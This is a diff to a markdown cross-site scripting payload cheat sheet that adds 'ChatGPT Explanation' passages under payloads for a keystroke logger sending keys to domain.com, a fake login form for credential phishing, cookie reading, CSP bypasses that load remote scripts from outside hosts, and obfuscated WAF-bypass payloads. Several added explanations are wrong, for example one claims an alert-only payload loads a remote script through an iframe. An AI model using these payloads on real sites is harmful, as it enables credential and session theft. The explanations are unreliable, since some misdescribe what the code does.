@@ -201,7 +201,6 @@ fclose($fp);
 2. The mode: 'no-cors' option is included to bypass the same-origin policy, which would otherwise block the request. 
 3. This allows the attacker to send the victim's cookies to a server under their control. 
 4. If the victim is currently logged in to the website, the attacker can use the stolen cookies to impersonate the victim and potentially gain unauthorized access to their account.
----
 
 
 ### UI redressing
@@ -214,6 +213,20 @@ history.replaceState(null, null, '../../../login');
 document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
 </script>
 ```
+**ChatGPT Explanation:**  
+This JavaScript code is doing the following:
+
+1. Using the history.replaceState method, it modifies the current page's URL to be "../../../login".
+2. Using the document.body.innerHTML property, it replaces the entire contents of the current page's body with a new HTML code. The new HTML code creates a login form with two input fields for username and password and a submit button.
+3. When the user loads the page it will be redirected to the login page and the login form will be displayed.
+4. When the user fills in the form and presses submit, the browser will send a request to the server with the provided username and password.
+5. The server will validate the user credentials and either allow the user to continue or redirect them back to the login page.
+
+It is important to note that the script is modifying the current page and replacing it with a login form that is not legitimate. This is a potential attack vector, known as phishing, since the user may enter their credentials into the form and send it to the attacker.
+
+---
+
+
 
 ### Javascript keylogger
 
@@ -222,6 +235,21 @@ Another way to collect sensitive data is to set a javascript keylogger.
 ```javascript
 <img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
 ```
+**ChatGPT Explanation:**  
+This HTML code creates an img element with a src attribute set to x. When the browser tries to load this image, it will encounter an error because the image does not exist at the specified location. As a result, the onerror event will trigger and execute the JavaScript code provided in the onerror attribute.
+
+The JavaScript code does the following:
+
+1. It assigns an anonymous function to the document.onkeypress event. This function will be executed every time a key is pressed on the keyboard.
+2. The function captures the key press event and retrieves the ASCII code of the pressed key from the e.which property.
+3. The ASCII code is then passed to the String.fromCharCode method, which converts the code to the corresponding character.
+4. The character is then passed as a query parameter to the URL http://domain.com?k=
+5. The script then uses the fetch method to send a GET request to the specified URL and passes the pressed key as a query parameter.
+6. The script then uses the this.remove() method to remove the img element from the page, so that the script will only execute once.
+
+This script can be used as a keylogger by attacker, it captures every key pressed on the keyboard and sends it to the attacker's server, which can be used to capture sensitive information like passwords, credit card numbers, and personal data.
+
+---
 
 ### Other ways
 
@@ -843,6 +871,16 @@ This is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE
 ```
 window.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});
 ```
+**ChatGPT Explation:**  
+This JavaScript code attempts to perform a Cross-Site Scripting (XSS) attack by using the window.cookieStore API to access the value of a cookie with a specific name "COOKIE NAME" and display an alert box with the value of the cookie using the alert() function.
+
+The window.cookieStore API is a feature available in web browsers that allows JavaScript code to access and manipulate the cookies of a website. The API provides methods to get, set and delete cookies, and the get() method is used in the code to retrieve the cookie value with the name "COOKIE NAME".
+
+The get() method returns a promise that resolves with a Cookie object containing the value, name, and other properties of the cookie. In this case, the code uses the then() method to handle the promise and a callback function to extract the value property of the Cookie object.
+
+The alert() function is used to display a message box with the value of the cookie, which is passed as an argument.
+
+---
 
 ### Bypass using javascript inside a string
 
@@ -1137,6 +1175,18 @@ XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o
 <script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
 <script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
 ```
+**ChatGPT Explanation:**  
+This is a malicious script that uses several different methods to try to execute a JavaScript alert function with the parameter of "1". Some of the methods include using a script tag, an image tag with an onerror event, an iframe with a javascript: URL, and a string of characters that are meant to be evaluated as JavaScript. The script also assigns a value to multiple variables using various properties and methods of JavaScript, however the purpose of these assignments is not clear. The script is attempting to execute the alert function which is a common method used in XSS attacks to pop-up a browser dialogue box, it could be used to steal sensitive information from the victim or redirect the victim to a phishing site.
+
+Here is a breakdown of what the payload is doing:
+
+1. The payload creates an object with properties that are set to the values of various properties and methods of JavaScript, and assigns it to the variable $.
+2. The payload uses the value of the `$` object to generate a string, which is then passed to the $() function.
+3. The $() function is used to execute the generated string, which is a script that creates an iframe and appends it to the current page.
+4. The iframe then loads a script from a remote server, which can potentially be used to exfiltrate sensitive data or perform other malicious actions.
+5. The payload also uses various techniques to evade detection, such as character encoding and obfuscation.
+
+---
 
 ### Bypass using jsfuck
 
@@ -1145,6 +1195,12 @@ Bypass using [jsfuck](http://www.jsfuck.com/)
 ```javascript
 [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
 ```
+**ChatGPT Explanation:**  
+Here are the steps this payload takes to execute an alert box:
+1. The payload uses a combination of characters like `[][(![]+[])[+[]]` which are used to construct an array and a function to call that array.
+2. It uses a combination of +, !, and [] to create a string containing the characters "alert" and then uses the eval function to execute it.
+3. The payload also uses newline characters, and ; to evade detection.
+---
 
 ## CSP Bypass
 
@@ -1171,6 +1227,14 @@ script=document.createElement('script');
 script.src='//bo0om.ru/csp.js';
 window.frames[0].document.head.appendChild(script);
 ```
+**ChatGPT Explanation:**  
+1. `script=document.createElement('script');` : this line creates a new script element.
+2. `script.src='//bo0om.ru/csp.js';` : this line sets the source of the script to "//bo0om.ru/csp.js"
+3. `window.frames[0].document.head.appendChild(script);` : this line appends the script element to the head of the first frame in the window.frames array.
+
+This script can be used for malicious purposes, such as injecting malicious code into a website, bypassing Content Security Policy (CSP), and performing a Cross-site scripting (XSS) attack. It is important to note that, this script can be used to load an external script from 'bo0om.ru', this script can contain any code and execute it on the user's browser.
+
+---
 
 ### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
 
@@ -1178,6 +1242,17 @@ window.frames[0].document.head.appendChild(script);
 // CSP Bypass with Inline and Eval
 d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
 ```
+**ChatGPT Explanation:**  
+This is a JavaScript code that creates an iframe, sets its src attribute to the href of the first link element that has a .css in its href attribute, appends the iframe to the body of the current document, then creates a script element and sets its src attribute to a specific URL. It then waits for 1 second and then appends the script element to the head of the iframe.
+
+The code contains the following elements:
+1. `d=document;` : this line assigns the current document to the variable d.
+2. `f=d.createElement("iframe");` : this line creates an iframe element and assigns it to the variable f.
+3. `f.src=d.querySelector('link[href*=".css"]').href;` : this line sets the src attribute of the iframe element to the href of the first link element that has a .css in its href attribute.
+4. `d.body.append(f);` : this line appends the iframe element to the body of the current document
+5. `s=d.createElement("script");` : this line creates a script element and assigns it to the variable s.
+6. `s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";` : this line sets the src attribute of the script element to a specific URL
+7. `setTimeout(function(){f.contentWindow.document.head.append(s);},1000)` : this line waits for 1 second and then appends the script element to the head of the iframe.
 
 ### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)
 
@@ -1238,12 +1313,39 @@ xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 ```
 <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
 ```
+**ChatGPT Explanation:**  
+1. `<svg/` : This is an opening tag for the HTML `<svg>` element and it is malformed as it has no closing tag.
+2. `onload=` : This is an event handler attribute which triggers the code when the svg element is loaded by the browser.
+3. `&#97&#108&#101&#114&#00116&#40&#41`: This is a series of encoded characters that represent the word "alert" and the parentheses "()" which are used to create a JavaScript function call.
+4. `&#x2f&#x2f` : This is a series of encoded characters that represent the characters "//", this is used to create a JavaScript comment, and comments are used to prevent the browser from executing the rest of the code.
+
+When rendered by a browser, this string will create a malformed HTML code, which will look like: `<svg/onload=alert()//`. This malformed code will execute the script when the svg element is loaded by the browser, which will pop-up an alert box. However, due to the // at the end, it will not execute any further code.
+
+---
 
 ### Cloudflare XSS Bypass - 27th February 2018
 
 ```html
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
 ```
+**ChatGPT Explanation:**  
+1. `<a href="` : This is an opening tag for the HTML `<a>` (anchor) element and the attribute href which sets the URL of the link.
+2. `j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;` : This is a malformed version of the word "javascript" that is separated by tab and newline characters.
+3. `&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">`: This is a JavaScript code that is executed when the link is clicked, the code alert(document.domain) will show an alert box with the current domain of the page.
+4. `X</a>` : This is a closing tag for the HTML `<a>` element.
+
+When rendered by a browser, this string will create a malformed HTML code, which will look like:
+```html
+<a href="j
+a
+v
+asc
+ri
+pt:alert(document.domain)">X</a>
+```
+This malformed code will execute the script when the link is clicked, which will pop-up an alert box with the current domain of the page.
+
+---
 
 ### Chrome Auditor - 9th August 2018
 
@@ -1266,12 +1368,34 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 ```javascript
 <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
 ```
+**ChatGPT Explanation:**  
+This code defines an HTML `<object>` element, which is used to embed external resources, such as an image, a video, or a web page, into a web page. The data attribute of the `<object>` element contains a data URI, which is a URI scheme that allows you to include data in-line in web pages as if they were external resources.
+
+The data URI of the data attribute contains the following elements:
+
+1. `data:text/html` is the media type and subtype of the data, which specifies that the data is in HTML format.
+2. `;;;` is a string of semicolons, which is used to create an empty origin.
+3. `base64,` is the encoding format of the data, which specifies that the data is encoded in base64.
+4. `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` is the encoded data, which is the base64-encoded representation of the following JavaScript code: <script>alert(1)</script>.
+
+When the <object> element is rendered by a browser, the JavaScript code inside the data attribute will be executed, which will pop-up an alert box with the value 1.
+
+----
 
 ### Incapsula WAF Bypass by [@daveysec](https://twitter.com/daveysec/status/1126999990658670593) - 11th May 2019
 
 ```html
 <svg onload\r\n=$.globalEval("al"+"ert()");>
 ```
+**ChatGPT Explanation:**  
+1. <svg is an opening tag for the HTML `<svg>` element, which is used to create scalable vector graphics.
+2. onload\r\n= is an event handler attribute which triggers the code when the svg element is loaded by the browser.
+3. `$.globalEval("al"+"ert()")` is a JavaScript code that concatenates the strings "al" and "ert()" to create the string "alert()" and then evaluates it as a JavaScript code by using the $.globalEval() function, this function is used to execute any JavaScript code passed as an argument. 
+4. `>` is the closing tag for the malformed HTML element.
+
+When rendered by a browser, this string will create a malformed HTML code, which will look like: <svg onload=$.globalEval("al"+"ert()");>. This malformed code will execute the script when the svg element is loaded by the browser, which will pop-up an alert box.
+
+---
 
 ### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th June 2018
 
@@ -1296,7 +1420,15 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 ```javascript
 \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
 ```
+**ChatGPT Explanation:**  
+1. `\u003e` is the unicode representation of the greater-than sign >.
+2. `\u003c` is the unicode representation of the less-than sign <.
+3. `\u0068\u0031` is the unicode representation of the string "h1", which is used to create a heading element `<h1>` in HTML.
+4. `onclick=alert('1')` is an event handler which triggers the alert() function with the argument '1' when the heading element is clicked.
 
+When rendered by a browser, this string will create a malformed HTML code, which will look like: `<h1 onclick=alert('1')>`. This malformed code will execute the script when the h1 element is clicked, which will pop-up an alert box with the value 1. 
+
+---
 ## Labs
 
 * [PortSwigger Labs for XSS](https://portswigger.net/web-security/all-labs#cross-site-scripting)
